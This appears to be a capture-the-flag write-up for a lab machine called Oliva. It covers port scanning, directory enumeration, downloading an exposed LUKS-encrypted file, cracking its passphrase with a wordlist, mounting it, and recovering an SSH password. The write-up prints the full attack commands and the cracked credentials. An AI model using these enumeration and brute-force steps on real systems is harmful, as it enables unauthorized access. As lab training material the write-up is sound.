@@ -1,0 +1,137 @@
+---------- Oliva Writeup ----------
+
+--> netdiscover 
+  -- We use netdiscover to scan network and find the machine for me it is.  
+    10.0.2.28       08:00:27:25:f8:23      1      60  PCS Systemtechnik GmbH  
+
+
+--> nmap
+  (root㉿kali)-[*]
+  └─# nmap -sV -sC -p- -A 10.0.2.28 
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 19:46 EDT
+  Nmap scan report for 10.0.2.28
+  Host is up (0.00053s latency).
+  Not shown: 65533 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+  | ssh-hostkey: 
+  |   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
+  |_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
+  80/tcp open  http    nginx 1.22.1
+  |_http-title: Welcome to nginx!
+  |_http-server-header: nginx/1.22.1
+  MAC Address: 08:00:27:25:F8:23 (Oracle VirtualBox virtual NIC)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.53 ms 10.0.2.28
+
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
+
+  -- 22/tcp ssh port and 80/tcp http port are open.
+
+
+--> whatweb
+  (root㉿kali)-[*]
+  └─# whatweb 10.0.2.28 
+  http://10.0.2.28 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.0.2.28], Title[Welcome to nginx!], nginx[1.22.1]
+
+
+--> gobuster
+  (root㉿kali)-[*]
+  └─# gobuster dir -u http://10.0.2.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt         
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.0.2.28
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Extensions:              html,php,txt
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /index.php            (Status: 200) [Size: 69]
+  /index.html           (Status: 200) [Size: 615]
+  Progress: 66514 / 882244 (7.54%)^C
+  [!] Keyboard interrupt detected, terminating.
+  Progress: 66582 / 882244 (7.55%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+  -- Lets check /index.php and /index.html
+  -- http://10.0.2.28/index.html is the defult ngix page.
+
+
+--> curl 
+  ─(root㉿kali)-[*]
+  └─# curl http://10.0.2.28/index.php
+  Hi oliva,
+  Here the pass to obtain root:
+
+
+  <a href="oliva">CLICK!</a>
+
+  -- We have the username lets note it down.
+  -- If we click download we can see the file called oliva! lets check it.
+
+
+--> file 
+  (root㉿kali)-[*]
+  └─# file oliva   
+  oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8...,
+  UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 
+  {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},
+  "area":{"type":"raw","offse
+
+  -- Luks encrypted file with version 2.
+  -- Let's check bruteforce-luks from github.
+
+
+--> brutefurce-luks
+  (root㉿kali)-[*]
+  └─# bruteforce-luks -t 4 -f /usr/share/wordlists/rockyou.txt -v 30  oliva 
+  Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+  Password found: bebita
+
+
+--> cryptsetup
+  ──(root㉿kali)-[*]
+  └─# cryptsetup luksOpen oliva olivas_file
+  Enter passphrase for oliva: --> we got the password.
+
+  -- Open the file.
+  -- File path is /dev/mapper
+
+
+--> mount 
+  -- we are basically mounting it like that 
+  mkdir /tmp/example  
+  mount /dev/mapper/example_file /tmp/example
+
+  -- Look inside the file the mypass.txt is the password of the user!!
+
+
+--> ssh login Yesthatsmypass!
+
+  
+
+
+
+  
+  
+
+
